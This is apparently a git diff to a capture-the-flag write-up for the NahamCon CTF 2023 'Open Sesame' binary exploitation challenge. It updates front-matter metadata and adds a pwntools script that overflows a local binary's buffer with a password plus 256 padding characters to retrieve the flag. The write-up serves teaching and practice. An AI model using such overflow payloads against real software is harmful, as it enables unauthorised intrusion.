@@ -1,9 +1,11 @@
 ---
-title: NahamCon2023 - Open Sesame
+title: NahamCon CTF 2023 - Open Sesame
 date: 2023-06-19 09:00:00 +0800
-categories: [NahamCon2023, Binary Exploitation]
+categories: [NahamCon CTF 2023, Binary Exploitation]
 tags: [binary-exploitation, pwn, buffer-overflow, gdb]
 img_path: /assets/img/ctfs/nahamcon2023/open-sesame/
+image:
+  path: open-sesame.jpg
 ---
 
 ## Info
@@ -299,6 +301,26 @@ flag{share_the_post_if_you_liked}
 {: .nolineno }
 
 and there we have the flag!
+
+### Exploit with pwntools
+
+We can make this whole process a little more automatic by using pwntools with the following script.
+
+```python
+#!/usr/bin/python3
+
+from pwn import *
+
+p = process("./open_sesame")
+
+buff = "A" * 256
+secret_pass = "OpenSesame!!!"
+
+p.recvuntil(b"What is the magic enchantment that opens the mouth of the cave?")
+p.sendline(str.encode(secret_pass + buff))
+
+print(p.recvall())
+```
 
 ## Final Thoughts
 
